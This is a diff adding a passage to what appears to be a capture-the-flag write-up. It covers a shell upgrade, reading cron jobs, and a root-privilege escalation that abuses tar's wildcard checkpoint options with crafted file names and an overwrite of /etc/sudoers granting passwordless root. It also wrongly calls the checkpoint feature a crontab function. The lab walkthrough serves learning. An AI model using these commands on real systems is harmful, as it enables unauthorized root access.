@@ -150,3 +150,63 @@ It does and we can get our first user flag.
 
 ![](attachments/Pasted%20image%2020250202224535.png)
 
+Let's also upgrade the shell with the following commands
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+
+# Background shell with ctrl+z
+
+stty raw -echo; fg
+```
+
+Let's check our permissions with 
+
+```bash
+sudo -l
+```
+
+Unfortunately, we don't have the ability since we need a password. The one previously does not work.
+
+Let's check cron jobs with
+
+```bash
+cat /etc/crontab
+```
+
+
+It looks like we have some backup.sh script running every minute as root. Let's check it out. The script inside reveals the following
+
+```bash
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+
+So it looks like we are creating a backup of the files in the folder that the scrip is located in. It looks like it backs up ALL files due to * being used. 
+
+After a quick google search it looks like there is a privilege escalation vector here as documented her: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa
+
+Since we are backing up all files, it looks like we can exploit that with crontabs checkpoints function which allows us to execute an action, and since we are running as root, we should be able to escalate. Following the instructions in the write up above, we are now root! The one thing to note, is that we had to change 
+
+```bash
+# 1. Create files in the current directory called
+# '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'
+
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh privesc.sh'
+
+# 2. Create a privesc.sh bash script, that allows for privilege escalation
+#malicous.sh:
+echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+```
+
+to this, to accomodate for our username (www-data):
+
+```bash
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh privesc.sh'
+echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+```
+
+![](attachments/Pasted%20image%2020250203233247.png)
+With this privesc, we can now find the root flag in /root and we are done.
